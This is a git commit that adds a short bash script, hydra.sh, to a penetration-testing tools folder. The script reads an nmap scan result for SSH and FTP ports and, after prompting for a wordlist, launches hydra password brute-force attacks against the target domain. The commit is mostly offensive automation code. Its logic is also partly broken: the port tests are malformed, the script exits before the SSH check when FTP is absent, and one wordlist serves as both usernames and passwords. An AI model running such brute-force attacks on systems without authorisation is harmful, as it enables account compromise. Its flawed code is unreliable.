29f3b0496030821f1ff9163ec99691d96250a521
parrotassassin15 <54908247+parrotassassin15@users.noreply.github.com>
2021-10-22 09:14:16 +0000

    added tools

---
+++ beta-testing/tools/hydra.sh
@@ -0,0 +1,41 @@
+
+domain=$1
+ssh=$(cat $domain-tcp-scan.nmap | grep ssh | cut -b 15,16,17)
+ftp=$(cat $domain-tcp-scan.nmap | grep ftp | cut -b 15,16,17)  
+
+function dict {
+    read -p "Enter Dictionary List: " wordlist
+
+}
+
+if [ $ftp !=0 ]
+then 
+    echo "[+] FTP Service Found!"
+    while true 
+    do
+        read -p "Do You Want To Bruteforce FTP? " answer
+        case $answer in
+            [Yy]* ) dict; hydra -L $wordlist -P $wordlist $domain ftp; break;;
+            [Nn]* ) break;;
+             * ) echo "Please Answer yes or no.";;
+        esac
+    done
+else
+     exit 0
+fi
+
+if [ $ssh !=0 ]
+then 
+    echo "[+] SSH Service Found!"
+    while true 
+    do
+        read -p "Do You Want To Bruteforce SSH? " answer
+        case $answer in
+            [Yy]* ) dict; hydra -L $wordlist -P $wordlist $domain ssh; break;;
+            [Nn]* ) break;;
+             * ) echo "Please Answer yes or no.";;
+        esac
+    done
+else
+     exit 0
+fi
